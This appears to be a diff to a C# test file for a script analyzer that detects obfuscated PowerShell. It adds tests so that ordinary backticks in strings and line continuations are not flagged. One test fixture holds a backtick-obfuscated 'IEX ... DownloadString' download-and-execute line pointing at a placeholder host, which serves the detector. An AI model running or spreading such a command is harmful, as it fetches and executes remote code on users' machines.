@@ -10,6 +10,11 @@ public class ScriptAnalyzerTests
     private static string[] Codes(string script, ScriptKind kind = ScriptKind.PowerShell) =>
         ScriptAnalyzer.Analyse(script, kind).Select(s => s.Code).ToArray();
 
+    /// <summary>A literal backtick and a literal double quote, kept out of the test
+    /// bodies so the escaping stays readable.</summary>
+    private const string TT = "`";
+    private const string QQ = "\"";
+
     // ---- Kind detection ----
 
     [Theory]
@@ -111,6 +116,49 @@ public class ScriptAnalyzerTests
         var signals = ScriptAnalyzer.Analyse(script, ScriptKind.PowerShell);
 
         Assert.Contains(signals, s => s.Code == "script-download-and-run" && s.Points > 0);
+    }
+
+    /// <summary>
+    /// npm.ps1, which ships with Node, was reported for "16 escape characters". Every
+    /// one was a backtick-quote quoting a path, or a doubled backtick inside a
+    /// .Replace call -- all inside strings, none mid-word. A backtick is also
+    /// PowerShell's line-continuation character, so counting them all flagged ordinary
+    /// multi-line scripts too.
+    /// </summary>
+    [Fact]
+    public void Backticks_inside_strings_are_not_obfuscation()
+    {
+        string npmShim =
+            "$NODE_EXE = $NODE_EXE.Replace(" + QQ + TT + TT + QQ + ", " + QQ + TT + TT + TT + TT + QQ + ")\n" +
+            "$NPM_CLI_JS = $NPM_CLI_JS.Replace(" + QQ + TT + TT + QQ + ", " + QQ + TT + TT + TT + TT + QQ + ")\n" +
+            "$NPM_ARGS = " + QQ + "run" + QQ + "\n" +
+            "Write-Output " + QQ + "& " + TT + QQ + "$NODE_EXE" + TT + QQ + " " + TT + QQ + "$NPM_CLI_JS" + TT + QQ + QQ;
+
+        Assert.DoesNotContain("script-escape-obfuscation", Codes(npmShim, ScriptKind.PowerShell));
+    }
+
+    [Fact]
+    public void Line_continuations_are_not_obfuscation()
+    {
+        string tidy =
+            "Get-ChildItem -Path C:\\temp " + TT + "\n" +
+            "              -Recurse " + TT + "\n" +
+            "              -Filter *.log " + TT + "\n" +
+            "              -Force " + TT + "\n" +
+            "              -ErrorAction SilentlyContinue";
+
+        Assert.DoesNotContain("script-escape-obfuscation", Codes(tidy, ScriptKind.PowerShell));
+    }
+
+    /// <summary>The shape the rule is actually for: a keyword broken up in bare
+    /// command text, where a backtick does nothing except defeat a reader.</summary>
+    [Fact]
+    public void Backticks_breaking_up_a_keyword_are_still_reported()
+    {
+        string obfuscated =
+            "I" + TT + "E" + TT + "X (New-Object Net.WebClient).DownloadString('http://x/y')";
+
+        Assert.Contains("script-escape-obfuscation", Codes(obfuscated, ScriptKind.PowerShell));
     }
 
     [Fact]
